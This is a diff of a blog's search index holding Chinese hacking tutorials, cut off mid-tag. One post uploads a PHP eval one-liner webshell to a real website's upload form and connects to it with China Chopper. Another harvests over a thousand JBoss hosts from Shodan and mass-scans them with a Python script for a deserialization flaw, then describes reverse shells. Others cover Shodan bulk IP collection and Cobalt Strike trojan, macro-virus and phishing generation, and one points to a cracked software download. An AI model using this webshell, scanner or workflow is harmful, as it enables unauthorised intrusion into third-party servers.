@@ -1,115 +1,221 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title><![CDATA[前台拿Webshell]]></title>
-    <url>%2F2018%2F04%2F24%2F%E5%89%8D%E5%8F%B0%E6%8B%BFWebshell%2F</url>
-    <content type="text"><![CDATA[抓包工具里的圣杯charles软件安装简单。下载地址：https://www.haiyangtop.cn/charles.rar 。根据你是X86还是X64机器来安装不同的charles版本，里边还有个破解文件charles.jar，要放在charles安装目录底下的lib目录。你再是找到压缩文件里边的ssl证书，双击安装，注意安装时要安装到受信任的根证书目录。 开始前台拿webshell我在一个网站的前台找到了一个上传点。我们先来上传一张正常的图片，然后在浏览器上右键点击图片检查，找到了上传路径。我们打开charles抓包来分析一下吧。你打开charles之后并不需要你改动其它什么，直接就能抓包了。现在上传一张正常图片的抓包。开始上传一句话，一句话内容：1&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; 上传成功，我们改下文件名。点击上面有支笔的图标修改上传内容，改文件名为55.php，并点击下面的Execute再次提交。构造下一句话地址，访问成功。 菜刀连接一句话成功连接一句话。我写这篇文章时，大家以为很简单就传上去了，其实我花费了足足有3个小时的功夫，经过了不断测试才成功，这次我用burpsuite来拦截上传失败了，不知道啥原因，写这篇文章时又理清了思考细节，所以你觉得很流畅。]]></content>
+<search> 
+  
+    
+    <entry>
+      <title>前台拿Webshell</title>
+      <link href="/2018/04/24/%E5%89%8D%E5%8F%B0%E6%8B%BFWebshell/"/>
+      <url>/2018/04/24/%E5%89%8D%E5%8F%B0%E6%8B%BFWebshell/</url>
+      <content type="html"><![CDATA[<h3 id="抓包工具里的圣杯charles"><a href="#抓包工具里的圣杯charles" class="headerlink" title="抓包工具里的圣杯charles"></a>抓包工具里的圣杯charles</h3><p>软件安装简单。下载地址：<a href="https://www.haiyangtop.cn/charles.rar" target="_blank" rel="noopener">https://www.haiyangtop.cn/charles.rar</a> <a id="more"></a>。根据你是X86还是X64机器来安装不同的charles版本，里边还有个破解文件charles.jar，要放在charles安装目录底下的lib目录。你再是找到压缩文件里边的ssl证书，双击安装，注意安装时要安装到受信任的根证书目录。<br><img src="/images/9.1.png" alt=""></p><h3 id="开始前台拿webshell"><a href="#开始前台拿webshell" class="headerlink" title="开始前台拿webshell"></a>开始前台拿webshell</h3><p>我在一个网站的前台找到了一个上传点。我们先来上传一张正常的图片，然后在浏览器上右键点击图片检查，找到了上传路径。<br><img src="/images/9.2.png" alt=""><br>我们打开charles抓包来分析一下吧。你打开charles之后并不需要你改动其它什么，直接就能抓包了。现在上传一张正常图片的抓包。<br><img src="/images/9.3.png" alt=""><br><strong>开始上传一句话</strong>，一句话内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/9.4.png" alt=""><br>上传成功，我们改下文件名。点击上面有支笔的图标修改上传内容，改文件名为<code>55.php</code>，并点击下面的Execute再次提交。<br><img src="/images/9.5.png" alt=""><br>构造下一句话地址，访问成功。<br><img src="/images/9.6.png" alt=""></p><h3 id="菜刀连接一句话"><a href="#菜刀连接一句话" class="headerlink" title="菜刀连接一句话"></a>菜刀连接一句话</h3><p>成功连接一句话。<br><img src="/images/9.7.png" alt=""><br>我写这篇文章时，大家以为很简单就传上去了，其实我花费了足足有3个小时的功夫，经过了不断测试才成功，这次我用burpsuite来拦截上传失败了，不知道啥原因，写这篇文章时又理清了思考细节，所以你觉得很流畅。</p>]]></content>
+      
       <categories>
-        <category>Webshell</category>
+          
+          <category> Webshell </category>
+          
       </categories>
-      <tags>
-        <tag>Webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Jboss反序列化漏洞批量验证]]></title>
-    <url>%2F2018%2F04%2F20%2FJboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%2F</url>
-    <content type="text"><![CDATA[什么是反序列化漏洞？2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。 Shodan批量下载ip在上篇文章 Shodan批量自动化 讲到如何批量下载ip，是为现在打下基础。执行下面代码下载第一页ip python Shodan_So.py -search “JBossWeb-2.1 port:8080” –list_ip &gt;&gt; ips1.txt –list_ip_port 执行下面代码下载第2页ip python Shodan_So.py -search “JBossWeb-2.1 port:8080” –list_ip &gt;&gt; ips10.txt –list_ip_port –page 2 以此类推，一共有搜索到1237个ip。 批量验证Jboss反序列化漏洞脚本代码1234567891011121314151617181920212223242526272829303132# coding=utf-8import requestsimport reimport sysdef get_status(url): try: r = requests.get(url, allow_redirects=False) status_code = r.status_code except requests.exceptions.ConnectionError as e: if (e): status_code = 404 return status_codedef get_target_ip(file_name): with open(file_name) as fo: contents = fo.read() return re.findall(r&quot;\b(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b:8080&quot;, contents)def request_main(result): for line in result: print line if line: status = get_status(&apos;http://&apos; + line + &apos;/&apos; + &apos;/invoker/readonly&apos;) if status == 500: print &quot;Success&quot; #success_file = open(&quot;success.txt&quot;) with open(&quot;success.txt&quot;,&quot;a&quot;) as fo: fo.write(line+&quot;\n&quot;) else: print &quot;Failed&quot;if __name__ == &quot;__main__&quot;: file_name = sys.argv[1] result = get_target_ip(file_name) request_main(result) 将代码保存为12.py，代码简单验证http://URL/invoker/readonly 网页状态码是500，就可能存在漏洞，省下很多时间。。。使用方法1python 12.py ip1.txt 网页状态码是500的写入success.txt文本。 Jboss反序列化工具直接获取的shell。如果遇到是乱码还可以使用另一个工具反弹shell。nc监听端口反弹shell收到反弹的shell]]></content>
+      
+      
+        <tags>
+            
+            <tag> Webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Jboss反序列化漏洞批量验证</title>
+      <link href="/2018/04/20/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81/"/>
+      <url>/2018/04/20/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81/</url>
+      <content type="html"><![CDATA[<h3 id="什么是反序列化漏洞？"><a href="#什么是反序列化漏洞？" class="headerlink" title="什么是反序列化漏洞？"></a>什么是反序列化漏洞？<a id="more"></a></h3><p>2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。</p><h3 id="Shodan批量下载ip"><a href="#Shodan批量下载ip" class="headerlink" title="Shodan批量下载ip"></a>Shodan批量下载ip</h3><p>在上篇文章 <a href="http://hamal.cc/2018/04/16/Shodan%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/">Shodan批量自动化</a> 讲到如何批量下载ip，是为现在打下基础。执行下面代码下载第一页ip</p><blockquote><p>python Shodan_So.py -search “JBossWeb-2.1 port:8080” –list_ip &gt;&gt; ips1.txt  –list_ip_port</p></blockquote><p><img src="/images/8.1.png" alt=""><br><img src="/images/8.2.png" alt=""><br><strong>执行下面代码下载第2页ip</strong></p><blockquote><p>python Shodan_So.py -search “JBossWeb-2.1 port:8080” –list_ip &gt;&gt; ips10.txt  –list_ip_port –page 2</p></blockquote><p>以此类推，一共有搜索到1237个ip。</p><h3 id="批量验证Jboss反序列化漏洞"><a href="#批量验证Jboss反序列化漏洞" class="headerlink" title="批量验证Jboss反序列化漏洞"></a>批量验证Jboss反序列化漏洞</h3><p><strong>脚本代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">def get_status(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url, allow_redirects=False)</span><br><span class="line">        status_code = r.status_code</span><br><span class="line">    except requests.exceptions.ConnectionError as e:</span><br><span class="line">        if (e):</span><br><span class="line">            status_code = 404</span><br><span class="line">    return status_code</span><br><span class="line">def get_target_ip(file_name):</span><br><span class="line">    with open(file_name) as fo:</span><br><span class="line">        contents = fo.read()</span><br><span class="line">    return re.findall(r&quot;\b(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b:8080&quot;, contents)</span><br><span class="line">def request_main(result):</span><br><span class="line">    for line in result:</span><br><span class="line">        print line</span><br><span class="line">        if line:</span><br><span class="line">            status = get_status(&apos;http://&apos; + line + &apos;/&apos; + &apos;/invoker/readonly&apos;)</span><br><span class="line">            if status == 500:</span><br><span class="line">                print &quot;Success&quot;</span><br><span class="line">                #success_file = open(&quot;success.txt&quot;)</span><br><span class="line">                with open(&quot;success.txt&quot;,&quot;a&quot;) as fo:</span><br><span class="line">                    fo.write(line+&quot;\n&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print &quot;Failed&quot;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    file_name = sys.argv[1]</span><br><span class="line">    result = get_target_ip(file_name)</span><br><span class="line">    request_main(result)</span><br></pre></td></tr></table></figure></p><p>将代码保存为<code>12.py</code>，代码简单验证<a href="http://URL/invoker/readonly" target="_blank" rel="noopener">http://URL/invoker/readonly</a> 网页状态码是500，就可能存在漏洞，省下很多时间。。。<br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 12.py ip1.txt</span><br></pre></td></tr></table></figure></p><p><img src="/images/8.3.png" alt=""><br>网页状态码是500的写入success.txt文本。</p><h3 id="Jboss反序列化工具"><a href="#Jboss反序列化工具" class="headerlink" title="Jboss反序列化工具"></a>Jboss反序列化工具</h3><p><img src="/images/8.4.png" alt=""><br>直接获取的shell。<br>如果遇到是乱码还可以使用另一个工具反弹shell。<br><strong>nc监听端口</strong><br><img src="/images/8.5.png" alt=""><br><strong>反弹shell</strong><br><img src="/images/8.6.png" alt=""><br><strong>收到反弹的shell</strong><br><img src="/images/8.7.png" alt=""></p>]]></content>
+      
       <categories>
-        <category>Webshell</category>
+          
+          <category> Webshell </category>
+          
       </categories>
-      <tags>
-        <tag>Webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Shodan批量自动化]]></title>
-    <url>%2F2018%2F04%2F16%2FShodan%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%2F</url>
-    <content type="text"><![CDATA[什么是ShodanShodan是互联网上最可怕的搜索引擎。Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。 Shodan的基本语法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647hostname：&quot;主机或域名&quot;如 hostname:&quot;google&apos;&apos;port：&quot;端口或服务&quot;如 port:&quot;21&quot;ip : &quot;ip地址&quot;如 ip : &quot;168.200.71.60&quot;net：&quot;IP地址或子网&quot;如 net:&quot;210.45.24.0/24&quot;vuln :指定漏洞的cve如 vuln:CVE-2015-8869但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160os :&quot;操作系统&quot;​如 os:&quot;centOS&quot;isp：&quot;ISP供应商&quot;如 isp:&quot;China Telecom&quot;product：&quot;操作系统/软件/平台&quot;如 product:&quot;Apache httpd&quot;version：&quot;软件版本&quot;如 version:&quot;3.1.6&quot;geo：&quot;经纬度&quot;如 geo:&quot;39.8779,116.4550&quot;country：&quot;国家&quot;如 country:&quot;China&quot;country:&quot;UN&quot;city：&quot;城市&quot;如 city:&quot;Hefei&quot;org：&quot;组织或公司&quot;如 org:&quot;google&quot;before/after：&quot;日/月/年&quot;如 before:&quot;25/03/2018&quot;after:&quot;25/03/2018&quot;asn : &quot;自治系统号码&quot;如 asn:&quot;AS2233&quot; 命令行下使用Shodan下载Shodan项目 git clone https://github.com/achillean/shodan-python.git 执行安装 cd shodan-pythonpython setup.py install Key进行初始化在Web网站的个人主页可以看到自己的API Key shodan init API_Key 用shodan查询 如 shodan count +”Apache” 其他更多语法，在Python脚本中使用Shodan API时，可以通过查看 官方文档 进行学习。 Python脚本批量自动化上面提到了使用Shodan API的开发文档，实战过程中为了方便起见，大可编写适合自己的脚本工具，进行批量化搜索和利用。下面介绍一下该工具的使用方法。连接地址:https://github.com/zev3n/Shodan_So ./Shodan_So.py -h -search命令后面接你要查询的内容，语法和在官网查询是一样的。 ./Shodan_So.py -search “apache” 可以看到，本工具的查询效果和网页查询几乎是一样的。这里需要着重介绍的参数还有--list_ip在查询命令后面加上这个参数之后，脚本会自动提取查询结果中的ip地址并打印。我们可以利用输出重定向将查询的ip列表保存到txt文件中，以供后续利用。例如：1./Shodan_So.py -search &quot;apache&quot; --list_ip &gt;&gt; ip.txt 另外，加上--list_ip_port参数后是返回IP地址:端口形式的地址，以供后续不同场景的利用。1./Shodan_So.py -search “apache” --list_ip &gt;&gt; ip.txt --list_ip_port -iprg参数接受的则是CIDR地址块，可实现指定子网范围内主机的查询。-f参数接受的是一个ip地址的文本文档，不同地址用换行隔开，本工具会依次读取文档内的ip地址并依次查询。参考文章]]></content>
+      
+      
+        <tags>
+            
+            <tag> Webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Shodan批量自动化</title>
+      <link href="/2018/04/16/Shodan%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
+      <url>/2018/04/16/Shodan%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
+      <content type="html"><![CDATA[<h3 id="什么是Shodan"><a href="#什么是Shodan" class="headerlink" title="什么是Shodan"></a>什么是Shodan</h3><p><strong>Shodan是互联网上最可怕的搜索引擎。</strong>Shodan所搜集到的信息是极其惊人的。<a id="more"></a>凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。</p><h3 id="Shodan的基本语法"><a href="#Shodan的基本语法" class="headerlink" title="Shodan的基本语法"></a>Shodan的基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">hostname：&quot;主机或域名&quot;</span><br><span class="line">如 hostname:&quot;google&apos;&apos;</span><br><span class="line"></span><br><span class="line">port：&quot;端口或服务&quot;</span><br><span class="line">如 port:&quot;21&quot;</span><br><span class="line"></span><br><span class="line">ip : &quot;ip地址&quot;</span><br><span class="line">如 ip : &quot;168.200.71.60&quot;</span><br><span class="line"></span><br><span class="line">net：&quot;IP地址或子网&quot;</span><br><span class="line">如 net:&quot;210.45.24.0/24&quot;</span><br><span class="line"></span><br><span class="line">vuln :指定漏洞的cve</span><br><span class="line">如 vuln:CVE-2015-8869</span><br><span class="line">但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160</span><br><span class="line"></span><br><span class="line">os :&quot;操作系统&quot;</span><br><span class="line">​如 os:&quot;centOS&quot;</span><br><span class="line"></span><br><span class="line">isp：&quot;ISP供应商&quot;</span><br><span class="line">如 isp:&quot;China Telecom&quot;</span><br><span class="line"></span><br><span class="line">product：&quot;操作系统/软件/平台&quot;</span><br><span class="line">如 product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">version：&quot;软件版本&quot;</span><br><span class="line">如 version:&quot;3.1.6&quot;</span><br><span class="line"></span><br><span class="line">geo：&quot;经纬度&quot;</span><br><span class="line">如 geo:&quot;39.8779,116.4550&quot;</span><br><span class="line"></span><br><span class="line">country：&quot;国家&quot;</span><br><span class="line">如 country:&quot;China&quot;</span><br><span class="line">country:&quot;UN&quot;</span><br><span class="line"></span><br><span class="line">city：&quot;城市&quot;</span><br><span class="line">如 city:&quot;Hefei&quot;</span><br><span class="line"></span><br><span class="line">org：&quot;组织或公司&quot;</span><br><span class="line">如 org:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">before/after：&quot;日/月/年&quot;</span><br><span class="line">如 before:&quot;25/03/2018&quot;</span><br><span class="line">after:&quot;25/03/2018&quot;</span><br><span class="line"></span><br><span class="line">asn : &quot;自治系统号码&quot;</span><br><span class="line">如 asn:&quot;AS2233&quot;</span><br></pre></td></tr></table></figure><h3 id="命令行下使用Shodan"><a href="#命令行下使用Shodan" class="headerlink" title="命令行下使用Shodan"></a>命令行下使用Shodan</h3><p><strong>下载Shodan项目</strong></p><blockquote><p>git clone <a href="https://github.com/achillean/shodan-python.git" target="_blank" rel="noopener">https://github.com/achillean/shodan-python.git</a></p></blockquote><p><img src="/images/7.1.png" alt=""><br><strong>执行安装</strong></p><blockquote><p>cd shodan-python<br>python setup.py install</p></blockquote><p><img src="/images/7.2.png" alt=""><br><strong>Key进行初始化</strong><br>在Web网站的个人主页可以看到自己的API Key</p><blockquote><p>shodan init API_Key</p></blockquote><p><img src="/images/7.3.png" alt=""><br>用shodan查询</p><blockquote><p>如 shodan count +”Apache”</p></blockquote><p><img src="/images/7.4.png" alt=""><br>其他更多语法，在Python脚本中使用Shodan API时，可以通过查看 <a href="http://shodan.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">官方文档</a> 进行学习。</p><h3 id="Python脚本批量自动化"><a href="#Python脚本批量自动化" class="headerlink" title="Python脚本批量自动化"></a>Python脚本批量自动化</h3><p>上面提到了使用Shodan API的开发文档，实战过程中为了方便起见，大可编写适合自己的脚本工具，进行批量化搜索和利用。下面介绍一下该工具的使用方法。<br>连接地址:<a href="https://github.com/zev3n/Shodan_So" target="_blank" rel="noopener">https://github.com/zev3n/Shodan_So</a></p><blockquote><p>./Shodan_So.py -h</p></blockquote><p><img src="/images/7.5.png" alt=""><br><code>-search</code>命令后面接你要查询的内容，语法和在官网查询是一样的。</p><blockquote><p>./Shodan_So.py -search “apache”</p></blockquote><p><img src="/images/7.6.png" alt=""><br>可以看到，本工具的查询效果和网页查询几乎是一样的。<br><img src="/images/7.7.png" alt=""><br>这里需要着重介绍的参数还有<code>--list_ip</code>在查询命令后面加上这个参数之后，脚本会自动提取查询结果中的ip地址并打印。我们可以利用输出重定向将查询的ip列表保存到txt文件中，以供后续利用。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Shodan_So.py -search &quot;apache&quot; --list_ip &gt;&gt; ip.txt</span><br></pre></td></tr></table></figure></p><p>另外，加上<code>--list_ip_port</code>参数后是返回IP地址:端口形式的地址，以供后续不同场景的利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Shodan_So.py -search “apache” --list_ip &gt;&gt; ip.txt --list_ip_port</span><br></pre></td></tr></table></figure></p><p><img src="/images/7.8.png" alt=""><br><code>-iprg</code>参数接受的则是CIDR地址块，可实现指定子网范围内主机的查询。<br><code>-f</code>参数接受的是一个ip地址的文本文档，不同地址用换行隔开，本工具会依次读取文档内的ip地址并依次查询。<br><a href="https://xz.aliyun.com/t/2070" target="_blank" rel="noopener">参考文章</a></p>]]></content>
+      
       <categories>
-        <category>Webshell</category>
+          
+          <category> Webshell </category>
+          
       </categories>
-      <tags>
-        <tag>Webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Cobalt Strike 3.8使用]]></title>
-    <url>%2F2018%2F04%2F07%2FCobalt-Strike-3-8%E4%BD%BF%E7%94%A8%2F</url>
-    <content type="text"><![CDATA[简介 Cobalt Strike集成了端口转发、扫描多模式端口监听Windows exe木马，生成Windows dll(动态链接库)木马，生成java木马，生成office宏病毒，生成木马捆绑钓鱼攻击，包括站点克隆目标信息获取java执行浏览器自动攻击等等。下载地址网上有好多，这里就不附上了。 启动Cobalt Strike 3.8先对teamserver文件进行赋权。 chmod +x teamserver 启动teamserver，命令为：./teamserver 服务器端ip 登录密码，默认端口是50050。 ./teamserver 192.168.x.x 123456 将teamserver启动之后，就可以运行客户端了。 java -jar cobaltstrike.jar Host是IP地址，Port为50050，User随意填，Password是你刚才设置的密码123456，点击Connect。 介绍各个功能模块翻译一下功能模块，更容易尽快掌握使用。123456789New Connection 新建立一个用户连接Preferences 配置自己喜欢的Visualization 可视化 pivot graph 控制主机 视图 session table 一个会话 Target table 目标表Vpn lnterfaces VPN接口listeners 建立个反弹shell的监听器script manager 脚本管理 1234567891011View模块Applications 显示受害者机器的应用信息Credentials 显示受害者机器的凭证信息，能更方便的进行后续渗透Downloads 文件下载Event Log 查看web日志。可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天Keystrokes 查看键盘记录Proxy Pivots 查看代理信息Screenshots 查看屏幕截图Script Console 在这里可以加载各种脚本以增强功能，脚本地址Targets 查看目标Web Log 查看web日志 12345678Packages 主要生成Payload HTML Application 生成恶意的HTA木马文件 MS Office Macro 生成office宏病毒文件 Payload Generator 生成各种语言版本的payload USB/CD AutoPlay 生成利用自动播放运行的木马文件 Windows Dropper 捆绑器，能够对文档类进行捆绑 Windows Executable 生成可执行exe木马 Windows Executable(S) 生成无状态的可执行exe木马 123456789Web Drive-by（钓鱼攻击） manager 对开启的web服务进行管理 Clone Site 克隆网站，可以记录受害者提交的数据 Host File 提供一个文件下载，可以修改Mime信息 PowerShell Web Delivery 类似于msf 的web_delivery Signed Applet Attack 使用java自签名的程序进行钓鱼攻击 Smart Applet Attack 自动检测java版本并进行攻击 System Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等Spear Phish 是用来邮件钓鱼的模块 12345678Reporting 生成报告Activity report 活动报告生成Hosts report 主机报告Indicators of compromise 目标报告Sessions report 会话报告Social engineering report 社会工程报告Reset data 重置数据Export data 数据出口 功能介绍完毕。 生成Windows木马下面生成一Windows木马。选择Cobalt Strike → listeners ，点击Add新建，Nnme随意填，ip是本机的ip，端口8899，点击Save。选择Attacks → Packages → Windows Executable，点击Generate生成木马。看到连接成功。]]></content>
+      
+      
+        <tags>
+            
+            <tag> Webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Cobalt Strike 3.8使用</title>
+      <link href="/2018/04/07/Cobalt-Strike-3-8%E4%BD%BF%E7%94%A8/"/>
+      <url>/2018/04/07/Cobalt-Strike-3-8%E4%BD%BF%E7%94%A8/</url>
+      <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>  Cobalt Strike集成了端口转发、扫描多模式端口监听Windows exe木马，生成Windows dll(动态链接库)木马，生成java木马，生成office宏病毒，生成木马捆绑钓鱼攻击，包括站点克隆目标信息获取java执行浏览器自动攻击等等。<br><a id="more"></a><br>下载地址网上有好多，这里就不附上了。</p><h3 id="启动Cobalt-Strike-3-8"><a href="#启动Cobalt-Strike-3-8" class="headerlink" title="启动Cobalt Strike 3.8"></a>启动Cobalt Strike 3.8</h3><p>先对<code>teamserver</code>文件进行赋权。</p><blockquote><p>chmod +x teamserver</p></blockquote><p><img src="/images/6.1.png" alt="" title="进行赋权"><br>启动<code>teamserver</code>，命令为：./teamserver 服务器端ip 登录密码，默认端口是50050。</p><blockquote><p>./teamserver 192.168.x.x 123456</p></blockquote><p><img src="/images/6.2.png" alt=""><br>将<code>teamserver</code>启动之后，就可以运行客户端了。</p><blockquote><p>java -jar cobaltstrike.jar</p></blockquote><p>Host是IP地址，Port为50050，User随意填，Password是你刚才设置的密码123456，点击Connect。<br><img src="/images/6.3.png" alt=""></p><h3 id="介绍各个功能模块"><a href="#介绍各个功能模块" class="headerlink" title="介绍各个功能模块"></a>介绍各个功能模块</h3><p>翻译一下功能模块，更容易尽快掌握使用。<br><img src="/images/6.4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">New Connection新建立一个用户连接</span><br><span class="line">Preferences配置自己喜欢的</span><br><span class="line">Visualization可视化   </span><br><span class="line">pivot graph    控制主机 视图 </span><br><span class="line">session table 一个会话</span><br><span class="line">Target table 目标表</span><br><span class="line">Vpn lnterfaces  VPN接口</span><br><span class="line">listeners        建立个反弹shell的监听器</span><br><span class="line">script manager脚本管理</span><br></pre></td></tr></table></figure></p><p><img src="/images/6.5.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">View模块</span><br><span class="line">Applications    显示受害者机器的应用信息</span><br><span class="line">Credentials    显示受害者机器的凭证信息，能更方便的进行后续渗透</span><br><span class="line">Downloads       文件下载</span><br><span class="line">Event Log       查看web日志。可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天</span><br><span class="line">Keystrokes      查看键盘记录</span><br><span class="line">Proxy Pivots    查看代理信息</span><br><span class="line">Screenshots     查看屏幕截图</span><br><span class="line">Script Console   在这里可以加载各种脚本以增强功能，脚本地址</span><br><span class="line">Targets     查看目标</span><br><span class="line">Web Log     查看web日志</span><br></pre></td></tr></table></figure></p><p><img src="/images/6.6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Packages 主要生成Payload</span><br><span class="line">HTML Application   生成恶意的HTA木马文件</span><br><span class="line">MS Office Macro    生成office宏病毒文件</span><br><span class="line">Payload Generator  生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay    生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper    捆绑器，能够对文档类进行捆绑</span><br><span class="line">Windows Executable  生成可执行exe木马</span><br><span class="line">Windows Executable(S)   生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure></p><p><img src="/images/6.7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Web Drive-by（钓鱼攻击）</span><br><span class="line">manager    对开启的web服务进行管理</span><br><span class="line">Clone Site     克隆网站，可以记录受害者提交的数据</span><br><span class="line">Host File   提供一个文件下载，可以修改Mime信息</span><br><span class="line">PowerShell Web Delivery 类似于msf 的web_delivery </span><br><span class="line">Signed Applet Attack   使用java自签名的程序进行钓鱼攻击</span><br><span class="line">Smart Applet Attack    自动检测java版本并进行攻击</span><br><span class="line">System Profiler  用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</span><br><span class="line">Spear Phish 是用来邮件钓鱼的模块</span><br></pre></td></tr></table></figure></p><p><img src="/images/6.8.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 